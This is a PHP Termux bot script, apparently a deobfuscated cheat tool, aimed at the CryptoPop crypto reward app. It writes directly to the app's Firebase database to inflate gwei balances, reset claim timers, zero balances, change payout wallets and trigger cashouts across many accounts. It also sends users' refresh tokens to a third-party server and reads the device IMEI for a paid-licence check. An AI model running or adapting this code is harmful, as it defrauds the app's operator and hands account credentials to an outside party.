<?php
#date_default_timezone_set('Asia/Jakarta');
system("clear");
 $var_0 = "\033[0"."m".PHP_EOL;
 $var_1 = "\t";
 $var_2 = "\r";
//warna
$var_3  ="\033[34m";  $var_4  ="\033[36m"; $var_5  ="\033[92m";
$var_6 ="\033[37m";  $var_7 ="\033[35m"; $var_8  ="\033[31m";
$var_9  ="\033[33m";  $var_10 ="\033[8m";  $var_11   ="\033[0"."m";

function curl( $var_12,$var_13 = 0,$var_14=array()){
 $var_15 = curl_init($var_12);
 curl_setopt($var_15, CURLOPT_RETURNTRANSFER, 1 ); 
 curl_setopt($var_15, CURLOPT_HTTPHEADER, $var_14 );
 curl_setopt($var_15, CURLOPT_SSL_VERIFYPEER, 1   );
 curl_setopt($var_15, CURLOPT_TIMEOUT,60           );
 curl_setopt($var_15, CURLOPT_VERBOSE, 0           );
if( $var_13 ){ // POST METHOD
 curl_setopt($var_15, CURLOPT_CUSTOMREQUEST, "POST");
 curl_setopt($var_15, CURLOPT_POSTFIELDS,    $var_13 ); }
 $var_27 = curl_exec($var_15);
 $var_29   = curl_getinfo($var_15);
 curl_close($var_15);
 if($var_29["redirect_url"]){ return $var_29["redirect_url"]; }
 return $var_27;
 }

function clr($var_35){ system("clear"); echo $var_35.$var_0;  }

function strip(){
echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";}

function saveas($var_38,$var_13){
 if(!file_exists($var_38)){file_put_contents($var_38,"[]"); }
 $var_42 = json_decode(file_get_contents($var_38),1);
 $var_44 = array_merge($var_42,$var_13);
 file_put_contents($var_38,json_encode($var_44,JSON_PRETTY_PRINT));}
 
function head($var_49){
 foreach($var_49 as $var_51=>$var_52){$var_53[]=$var_51.": ".$var_52;}
 return $var_53; }
 
function parse($var_57){
 parse_str($var_57,$var_59);return $var_59;}
 
function build($var_59){return http_build_query($var_59);}

function settings($var_63,$var_64,$var_65 = ""){
$var_4   = "\033[36m"; $var_5  = "\033[92m"; $var_6  = "\033[37m";
$var_12 = "https://tuyulgaple.online/adidoank/";
$var_70 = json_encode(
    array(
        'sk' => $var_63,
        'vr' => $var_64 ));
$var_73 = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/json',
        'content' => $var_70
    ));
$var_75 = stream_context_create($var_73);
$var_77     = json_decode(file_get_contents($var_12, false, $var_75),1);

if($var_77){ $var_81 = $var_5."online"; }else{ $var_81 = $var_6."offline"; }
if(!$var_77){ 
 $var_35     = native($var_63,$var_64);
 echo $var_65.$var_0.$var_35; exit; }
 
$var_35      = $var_77["baner"];
$var_94   = $var_4."[-] server $var_81 ";
if(!$var_77["status"]){ 
 $var_98 = "skrip di non-aktifkan\n";
 echo $var_65.$var_94.$var_0.$var_35.$var_98; exit; }
else{ return $var_65.$var_94.$var_0.$var_35; }  }

function native($var_63,$var_64) {
$var_4   = "\033[36m"; $var_3  ="\033[34m"; 
$var_6  = "\033[37m"; $var_8 ="\033[31m";
$var_65 = $var_6."
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$var_3
ââââ ââ¦â âââ¦â ââ¦â âââ ââââ ââââ âââ âââ âââ
ââââ âââ ââââ âââ âââ ââââ£ ââââ ââ¬â âââ ââ¦â$var_6
ââââ âââ ââ©ââ âââ âââ ââââ ââ â£â âââ âââ ââ©â$var_4
ââââ âââ ââââ âââ âââ ââââ ââââ âââ âââ âââ$var_6
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$var_6 - skrip$var_3 $var_63$var_6 versi$var_4 $var_64
$var_8 - tidak dapat terhubung ke server$var_3 tuyulgaple
$var_6 - pastikan anda memiliki aksess internet yang baik
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
return $var_65;
  }
  
function timer($var_98,$var_131){
 date_default_timezone_set('UTC');
 $var_132 = time()+$var_131;
while(true):
 echo "\r                                                        \r";
 $var_134 = $var_132-time();
 if($var_134<1){ break; }
 echo $var_98." ".date("H:i:s",$var_134);
 sleep(1);
endwhile; 
  }

function rata($var_57,$var_140 = 14){
 $var_141  = strlen($var_57);
    if($var_141 < $var_140 ){ 
    $var_145   = $var_140-$var_141; 
    $var_57 = $var_57.str_repeat(" ",$var_145);  }
    elseif( $var_141 > $var_140 ){ $var_57 = substr($var_57,0,$var_140); }
 return $var_57; }  
 
function slow($var_57){
 $var_158 = str_split($var_57);
 foreach( $var_158 as $var_161 ){ echo $var_161; usleep(10000); }
 }

function joint($var_13,$var_57 = "&"){
  $var_165 = "";
  foreach($var_13 as $var_51 => $var_52 ){ $var_165 .= $var_51."=".$var_52.$var_57; }
  return $var_165;
 }

function verif_user($var_63,$var_175){
 $var_12 = "https://tuyulgaple.online/premium/";
 $var_177 = json_encode([
 "request"  => $var_63,
 "tipe"     => "verif",
 "userid"   => $var_175 ]);
 
 $var_180 = curl_init();
 curl_setopt_array($var_180, array(
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_URL            => $var_12,
    CURLOPT_CUSTOMREQUEST  => "POST",
    CURLOPT_POSTFIELDS     => $var_177,
    CURLOPT_VERBOSE        => false  ));
 $var_27 = curl_exec($var_180);
 $var_186     = json_decode($var_27,1);
 if( $var_186["code"]==200 ){ return $var_186["code"]; } 
 }

function lisensi($var_63){

  if(file_exists($_SERVER["PREFIX"]."/bin/getprop")){
   // OS 5 - 6
   $var_191 = explode(PHP_EOL,shell_exec("getprop persist.radio.imei"));
   if($var_191[0]){ return hash("sha1",$var_63.$var_191[0]); }
  
   // OS 5 - 6
   $var_191 = explode(PHP_EOL,
          shell_exec("getprop persist.sys.vtouch.imei"));
   if($var_191[0]){ return hash("sha1",$var_63.$var_191[0]); }
  }
  
  // OS 7 - 9
  $var_199 = $_SERVER["PREFIX"]."/libexec/termux-api";
  if(!file_exists($var_199)){ return "termux-api belum di install !"; }
    $var_201 = json_decode(shell_exec("termux-telephony-deviceinfo"),1);
    if($var_202 = $var_201["device_id"]){ return hash("sha1",$var_63.$var_202); }
  
  // all os   
  $var_206    = "termux-keystore ";
  $var_42    = "list -d";
  $var_208  = "tuyulgaple";
  $var_209 = "generate $var_208 -a RSA";

  $var_211   = $_SERVER["PREFIX"]."/bin/termux-keystore";  
  if(!file_exists($var_211)){ 
    return "apk or package termux-api belum di install !";
     }
  $var_201 = json_decode(shell_exec($var_206.$var_42),1);
  if(!$var_201){
    shell_exec($var_206.$var_209);
    $var_201 = json_decode(shell_exec($var_206.$var_42),1); }
  
  while(true):
  foreach( $var_201 as $var_51 => $var_52 ){
   if($var_52["alias"] == $var_208 ){ $var_227 = $var_52["modulus"]; break 2; } }
  
  if( !$var_227 ){
    shell_exec($var_206.$var_209);
    $var_201 = json_decode(shell_exec($var_206.$var_42),1); }
  endwhile;
  if( $var_227 ){ return hash("sha1",$var_63.$var_227); }
  }

function notif($var_238 = "waktunya claim"){
  $var_239= "termux-toast -s '".$var_238."'";
  $var_98 = "-c '".$var_238."'";
  $var_206 = "termux-notification --sound ".$var_98;
  shell_exec($var_206);  shell_exec($var_239);
  readline("press enter to continue  ");
  }  

/////////////////////////////////////////////////////////////////

$var_63="cpop";$var_64="1.4"; $var_249="config.json";

class bot{
 
public function __construct(){
 $this-> server = "https://cryptopop.herokuapp.com/";
 $this-> host   = "cryptopop-ec1c1-919e1.firebaseio.com";
 $this-> api    = "https://cryptopop-ec1c1-919e1.firebaseio.com";
 $this-> magic  = 294;
 /*$this-> config = [ 
   "Content-Type"    => "application/json; charset=UTF-8",
   "User-Agent"      => "okhttp/3.12.0" ];*/
 $this-> config = [
   "Host"                  => $this->host,
   "Upgrade"               => "websocket",
   "Sec-WebSocket-Version" => "13",
   "User-Agent"            => "Firebase/5/19.6.0/28/Android"
   ];
 }
private function curl( $var_12,$var_13 = 0 ){
 $var_15 = curl_init($var_12);
 curl_setopt($var_15, CURLOPT_RETURNTRANSFER, 1 ); 
 curl_setopt($var_15, CURLOPT_HTTPHEADER, $this->head() );
 curl_setopt($var_15, CURLOPT_SSL_VERIFYPEER, 1   );
 curl_setopt($var_15, CURLOPT_TIMEOUT,300         );
 curl_setopt($var_15, CURLOPT_VERBOSE, 0          );
 
if( $var_13 ){ // POST METHOD
 curl_setopt($var_15, CURLOPT_CUSTOMREQUEST, "POST");
 curl_setopt($var_15, CURLOPT_POSTFIELDS,    $var_13 ); }
 $var_27 = curl_exec($var_15);
 $var_29   = curl_getinfo($var_15);
 curl_close($var_15);
 if($var_29["redirect_url"]){ return $var_29["redirect_url"]; }
 return $var_27;
 }
private function soket ($var_271 = "POST",$var_12="",$var_13="") {
    $var_274[] = 'Accept: */*';
    $var_274[] = 'Cache-Control: no-cache';
    $var_274[] = 'Connection: keep-alive';
    $var_274[] = 'Content-Type: application/json';
    $var_274[] = 'Host: '.$this->host;
    $var_274[] = 'User-Agent: Firebase/5/19.6.0/24/Android';
    $var_274[] = 'cache-control: no-cache';

 $var_180 = curl_init();
 curl_setopt_array($var_180, array(
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_URL            => $var_12,
    CURLOPT_TIMEOUT        => 300,
    CURLOPT_CUSTOMREQUEST  => $var_271,
    CURLOPT_POSTFIELDS     => $var_13,
    CURLOPT_HTTPHEADER     => $this->head(),
      ));
 $var_27 = curl_exec($var_180);                                   
 $var_288   = curl_getinfo($var_180,CURLINFO_HTTP_CODE);                   
 curl_close($var_180); 
 if($var_201 = json_decode($var_27,1)){ return $var_201; }    
 return $var_27;
 }

private function head(){
 foreach($this->config as $var_51=>$var_52){ $var_53[]=$var_51.": ".$var_52; }
 return $var_53; 
 }
public function get_settings(){
  $var_12 = $this->api."/walletcontent/.json?auth=".$this->token;
  $var_201= json_decode($this->curl($var_12),1);
  if(!$var_201){ return false; }
  return [
    "versi"  => $var_201["live_version"],
    "timer"  => $var_201["claim_interval"],
    "max"    => $var_201["max_gwei_acc"],
    "ref"    => $var_201["new_referral"]   ]; 
  }
public function reset_data(){
  $var_309 = $this->get_settings();
  if(!$var_309){ return false; }
  $var_311 = $this->users();
  if(!$var_311["objectId"]){ return false; }
  
  $var_313   = 0;
  $var_314  = ($var_313*$var_309["ref"]);
  $var_311["referral_accu"] = $var_314+$this->magic;
  $var_311["gwei_accu"]     = $var_313;
  $var_311["last_claimed"]  = "0";
  
  return $this->patch($var_311);
  }

public function refresh($var_323){
  $var_12 = "https://tuyulgaple.online/base/";
  $var_177 = json_encode([
    "request"  => "cryptopop",
    "tipe"     => "token",
    "ftoken"   => $var_323  ]);
  $var_201 = json_decode(curl($var_12,$var_177),1);  
  if(!$var_201["data"]["access_token"]){ return false; }
  $var_331 = $var_201["data"]["userinfo"]["users"][0];

  $this->token = $var_201["data"]["access_token"];
  $this->uid   = $var_201["data"]["user_id"];
  $this->email = $var_331["email"];
  $this->nikname = $var_331["displayName"];  
  return [ 
    "refresh" => $var_323, 
    "token"   => $this->token, 
    "uid"     => $this->uid,
    "email"		=> $this->email,
    "nikname" => $this->nikname ];
  }
public function cek_error($var_323){
  $var_12 = "https://tuyulgaple.online/base/";
  $var_177 = json_encode([
    "request"  => "cryptopop",
    "tipe"     => "token",
    "ftoken"   => $var_323  ]);
  $var_201 = json_decode(curl($var_12,$var_177),1); 
  if(!$var_201["data"]["access_token"]){ return $var_201; }
  $var_331 = $var_201["data"]["userinfo"]["users"][0];

  $this->token = $var_201["data"]["access_token"];
  $this->uid   = $var_201["data"]["user_id"];
  $this->email = $var_331["email"];
  $this->nikname = $var_331["displayName"];  
  return [ 
    "refresh" => $var_323, 
    "token"   => $this->token, 
    "uid"     => $this->uid,
    "email"		=> $this->email,
    "nikname" => $this->nikname ];
  }  
public function autoLoad($var_13){
  if(!is_array($var_13)){ return false; }
  $var_356 = count($var_13);
  $var_358     = 0;
  $var_359 = array();
  foreach( $var_13 as $var_51 => $var_52 ){
    $var_358++;
    $var_364 = floor($var_358*100/$var_356);
    echo "auto-load account $var_364 % , please wait";
    if($var_368 = $this->refresh($var_52["token"])){ 
      $var_359 = array_merge($var_359,[ $this->uid => $var_368 ]);
      }
    echo "\r                                                \r";
    }
  $this->multi = $var_359; return $var_359;
  }
public function set_config($var_13){
  foreach($var_13 as $var_51 => $var_52){ $this->$var_51 = $var_52; }
  }
public function users(){
  $var_381 = http_build_query([ "auth" => $this->token ]);
  $var_12   = $this->api."/CoinbaseUsers/".$this->uid."/.json?$var_381";
  return json_decode($this->curl($var_12),1);
  }
public function addPoin($var_385 = 90){
  $var_309 = $this->get_settings();
  if(!$var_309){ return false; }
  $var_388 = round($var_385/100*$var_309["max"]);
  $var_311 = $this->users();
  if(!$var_311["objectId"]){ return false; }
  if(!$var_311["referral_accu"]){ $var_311["referral_accu"] = $this->magic; }
  $var_313   = $var_311["gwei_accu"];
  if($var_313 == $var_388){ return ["limit" => "max reward amount"]; }
    
  $var_399   = rand(5,14);
  $var_400 = $var_313+$var_399;
  if($var_400 >= $var_388){ $var_400 = $var_388; }
  $var_314  = ($var_400*$var_309["ref"]);
  $var_311["referral_accu"] = $var_314+$this->magic;
  $var_311["gwei_accu"]     = $var_400;

  $var_414 = json_encode($this->parseData($var_311));
  $var_381   = http_build_query([ "auth" => $this->token ]);
  $var_12     = $this->api."/CoinbaseUsers/".$this->uid."/.json?$var_381";
  return $this->soket("PATCH",$var_12,$var_414);
  }
public function parseData($var_414){
  return [
    "email"               => $var_414["email"],
    "gwei_accu"           => $var_414["gwei_accu"],
    "gwei_total_claimed"  => $var_414["gwei_total_claimed"],
    "last_claimed"        => $var_414["last_claimed"],
    "objectId"            => $var_414["objectId"],
    "referral_accu"       => $var_414["referral_accu"],
    "score"               => $var_414["score"] ];
  }
public function patch($var_13){
  $var_414 = json_encode($this->parseData($var_13));
  $var_381   = http_build_query([ "auth" => $this->token ]);
  $var_12     = $this->api."/CoinbaseUsers/".$this->uid."/.json?$var_381";
  return $this->soket("PATCH",$var_12,$var_414);
  }
public function cashout(){
  $var_175= $this->users();
  $var_309 = $this->get_settings();
  $var_177 = json_encode([
            #"accessToken" => "RECAPTCHA TOKEN",
            "email"       => $var_175["email"],
            "user_id"     => $this->uid,
            "version_no"  => $var_309["versi"]  ]);
  $this->config["Action"] = "claim";
  return json_decode($this->curl($this->server,$var_177),1);
  }
public function change($var_443){
  $var_175= $this->users();
  if(!$var_175["objectId"]){ return false; }
  $var_309 = $this->get_settings();
  // test cashout
  $var_177 = json_encode([           
            "email"       => $var_443,
            "user_id"     => $this->uid,
            "version_no"  => $var_309["versi"]  ]);
  $this->config["Action"] = "new";
  $var_450 = $this->curl($this->server,$var_177);  
  
  // update email info
  unset($this->config["Action"]);
  $var_313   = $var_175["gwei_accu"];
  $var_314  = ($var_313*$var_309["ref"]);
  $var_175["referral_accu"] = $var_314+$this->magic;
  $var_175["email"] 				  = $var_443;
  return $this->patch($var_175);
  }
public function unlockTime(){
  $var_309 = $this->get_settings();
  if(!$var_309){ return false; }
  $var_311 = $this->users();
  if(!$var_311["objectId"]){ return false; }
  
  $var_313   = $var_311["gwei_accu"];
  $var_314  = ($var_313*$var_309["ref"]);
  $var_311["referral_accu"] = $var_314+$this->magic;
  $var_311["gwei_accu"]     = $var_313;
  $var_311["last_claimed"]  = "0";
  
  return $this->patch($var_311);
  }
}
//////////////////////////////////////////////////////////////

error_reporting(0);
//$var_35 = settings($var_63,$var_64,"");
$var_480 = new bot();


while(true):  clr($var_35);
$var_42 = json_decode(file_get_contents($var_249),1);
if(!$var_42){ $var_485 = 0; } else { $var_485 = count($var_42); }
echo $var_4."total account cpop$var_5 $var_485".$var_0;
echo $var_6.$var_1."[1]$var_5 add    account".$var_0;
echo $var_6.$var_1."[2]$var_5 info   account".$var_0;
echo $var_6.$var_1."[3]$var_5 modif  account".$var_0;
echo $var_6.$var_1."[4]$var_5 start  Bot".$var_0;
$var_508 = readline("options: ");
strip();

if(!$var_480->lisensi){
  echo $var_5."verification your device,$var_6 please wait ...";sleep(1);
  $var_512 = lisensi($var_63);  
  if(!$var_514 = verif_user($var_63,$var_512) ){
   echo "\r                                                        \r";
   echo $var_8."device not verifed,$var_6 please buy premium first !".$var_0;
   echo $var_4."lisensi:$var_5 ".$var_512.$var_0;
   strip(); exit;
   }
  echo "\r                                                        \r";
  $var_480->lisensi = $var_512; 
  }

switch($var_508):
  case 1: // add new account 
    $var_323 = readline("refresh token: ");
    clr($var_35);
    if($var_201 = json_decode($var_323,1)){ 
      $var_323 = $var_201["refresh_token"]; 
      }
    if(!$var_480->refresh($var_323)){
      echo $var_8."refresh token error !".$var_0;
      break;
      }
    $var_175  = $var_480->users();
    if(!$var_175["objectId"]){ 
      echo $var_8."gagal ambil data user !".$var_0;
      break; 
      }
    $var_443 = $var_175["email"];
    echo $var_5."success add account$var_4 $var_443".$var_0;
    $var_548   = $var_175["objectId"];
    saveas($var_249,[ $var_548 => [ "token" => $var_323 ] ]);
    break;
  
  case 2: // info account
    $var_358 = 0;
    foreach( $var_42 as $var_51 => $var_52 ){
    $var_358++;
    $var_450 = $var_480->cek_error($var_52["token"]);
    if(!$var_450["token"]){
     $var_98 = $var_450["msg"];
     echo $var_6."account$var_4 $var_358/$var_485 ->$var_8 token error $var_98".$var_0;
     strip();
     continue;
     }
    
    $var_175  = $var_480->users();
    if(!$var_175["objectId"]){ 
    echo $var_6."account$var_4 $var_358/$var_485 ->$var_8 gagal ambil data !".$var_0;
    strip();
    continue; 
    }
    
    $var_313  = $var_175["gwei_accu"];
    $var_356= $var_175["gwei_total_claimed"];
    $var_443= $var_175["email"];
    $var_586 = $var_175["last_claimed"];
    if(!$var_586){ $var_589 = $var_5."ready to claim"; }
    else{
      $var_591    = $var_586+(86400*3);       
      $var_593    = date("d-m-Y H:i:s",$var_591+7*60*60);
      $var_589 = $var_9.$var_593.$var_6." WIB";
      if( time() > $var_591 ){ $var_589 = $var_5."ready to claim"; }
      }
    echo $var_6."account$var_4 $var_358/$var_485 ->$var_5 conected$var_3 ".$var_480->nikname.$var_0;
    echo $var_6.$var_1.rata("balance").":$var_5 $var_313$var_4 Gwei".$var_0;
    echo $var_6.$var_1.rata("total claim").":$var_5 ".$var_356.$var_4." Gwei".$var_0;
    echo $var_6.$var_1.rata("email").": ".$var_3.$var_480->email.$var_0;
    echo $var_6.$var_1.rata("coinbase").":$var_5 ".$var_443.$var_0;
    echo $var_6.$var_1.rata("claim time").": ".$var_589.$var_0;
    strip();    
    }
    break;
   
  case 3: // modif account
    echo $var_6.$var_1."[1]$var_5 change wallet".$var_0;
    echo $var_6.$var_1."[2]$var_5 unlock withdraw".$var_0;
    echo $var_6.$var_1."[3]$var_5 reset balance".$var_0;
    echo $var_6.$var_1."[4]$var_5 timer claim for humman ".$var_0;
    $var_652 = readline("modif: ");
      
    $var_358 = 0;
    foreach( $var_42 as $var_51 => $var_52 ){
    $var_358++;
    $var_323 = $var_52["token"];
    if(!$var_480->refresh($var_323)){
    echo $var_6."account$var_4 $var_358/$var_485 ->$var_8 refresh token error".$var_0;
    strip();
    continue;
    }
    
    $var_175  = $var_480->users();
    if(!$var_175["objectId"]){ 
    echo $var_6."account$var_4 $var_358/$var_485 ->$var_8 gagal ambil data !".$var_0;
    strip();
    continue; 
    }
    
    $var_313  = $var_175["gwei_accu"];
    $var_443= $var_175["email"];
    $var_586 = $var_175["last_claimed"];
    if(!$var_586){ $var_589 = $var_5."ready to claim"; $var_591 = 0; }
    else{
      $var_591    = $var_586+(86400*3); 
      $var_593    = date("d-m-Y H:i:s",$var_591+7*60*60);
      $var_589 = $var_9.$var_593.$var_6." WIB";
      if( time() > $var_591 ){ $var_589 = $var_5."ready to claim"; }
      }
    echo $var_6."account$var_4 $var_358/$var_485 ->$var_5 conected$var_3 ".$var_480->nikname.$var_0;
    echo $var_6.$var_1.rata("balance").":$var_5 $var_313$var_4 Gwei".$var_0;
    echo $var_6.$var_1.rata("email").": ".$var_3.$var_480->email.$var_0;
    echo $var_6.$var_1.rata("coinbase").":$var_5 ".$var_443.$var_0;
    switch($var_652){
    case 1:     
     $var_723 = readline($var_1.$var_6.rata("new coinbase").":$var_5 ");  
    
     if($var_723==$var_443 or !$var_723 ){ strip(); break; }
     $var_730 = $var_480->change($var_723);
     if($var_730["email"] != $var_723){
       echo $var_1.$var_9."failed change wallet !".$var_0;
       strip();
       break;
       }
     echo $var_1.$var_5."update wallet coinbase success ".$var_0;
     strip();
     break;
    case 2:
     if(!$var_586 or time() > $var_591 ){ strip(); break; }
     echo $var_6.$var_1.rata("claim time").": ".$var_589.$var_0;
     $var_747 = readline($var_1."unlock limit y/n: ");
     if($var_747 != "y"){ strip(); break; }
     $var_750 = $var_480->unlockTime();
     if($var_750["objectId"]){ $var_753 = $var_5."unlock success "; }
     else{ $var_753 = $var_9."failed unlock"; }
     echo $var_1.$var_753.$var_0; strip();
     break;
   case 3:
     $var_760 = readline("konfirmasi y/n: ");
     if($var_760!="y"){ strip(); break; }
     $var_762 = $var_480->reset_data();
     if($var_762["objectId"]){ $var_753 = $var_5."reset balance success "; }
     else{ $var_753 = $var_9."failed reset balance"; }
     echo $var_1.$var_753.$var_0; strip();
     break;
   case 4:
     if( time() < $var_591 ){ strip(); break; }
     echo $var_6.$var_1.rata("claim time").": ".$var_589.$var_0;
     $var_777 = readline("start timer y/n: ");
     if($var_777 != "y"){	strip(); break;	}
     timer("notification after time ",3600);
     notif(); strip();
     break;
    default: break 2;
    }  }
    break;
    
  case 4: // start Bot
    $var_385 = readline("target amount %(default=90): ");
    if(!is_numeric($var_385) or $var_385 > 100){ $var_385 = 90; }
    if(!$var_783 = $var_480->autoLoad($var_42)){ break; }
    
    while(true):
    $var_358   = 0;
    $var_787 = 0;
    foreach( $var_783 as $var_51 => $var_52 ){
    $var_480->set_config($var_52);
    $var_358++;
   
    $var_175  = $var_480->users();
    if(!$var_175["objectId"]){ 
    echo $var_6."account$var_4 $var_358/$var_485 ->$var_8 gagal ambil data !".$var_0;
    if($var_368 = $var_480->refresh($var_52["refresh"])){ $var_783[$var_51] = $var_368; }
    strip();
    continue; 
    }
    
    $var_313  = $var_175["gwei_accu"];
    $var_98  = $var_6."balance$var_5 $var_313$var_4 Gwei";
    echo $var_6."account$var_4 $var_358/$var_485 ->$var_5 conected $var_98".$var_0;
    
    $var_823 = $var_480->get_settings();
    $var_388  = ($var_823["max"]*$var_385/100);
    $var_828= 0;
    $var_829 = 5;
    while($var_828 < $var_829):
     $var_832 = $var_480->addPoin($var_385);
     if(!$var_832){ break; }
     if($var_836 = $var_832["error"]){ 
     echo $var_8.$var_836.$var_6." setting hasbeen change !".$var_0;     
     continue;
     }
          
     if($var_842 = $var_832["limit"]){ 
     echo $var_1.$var_5.$var_842.$var_0; 
     $var_787++;
     break; 
     }
        
     $var_849 = $var_832["gwei_accu"];
     $var_753 = "$var_849$var_6/$var_3$var_388$var_4 Gwei";
     echo $var_1.$var_5."update$var_6 balance$var_5 $var_753".$var_0;
     $var_828++;
    endwhile;
    strip();    
    }
    
    if($var_787 >= $var_485){ break; }
    endwhile;
    break;
endswitch;
readline($var_4."press enter main menu ");
endwhile;
